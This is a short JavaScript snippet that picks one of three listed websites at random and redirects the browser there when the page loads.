// URL list
const urls = [
    "https://alcashzone.com",
    "https://alcashedu.com",
    "https://fastdevox.com",
    // Add more URLs here
];

// Random URL selection and redirection
const randomURL = urls[Math.floor(Math.random() * urls.length)];
window.location.href = randomURL;
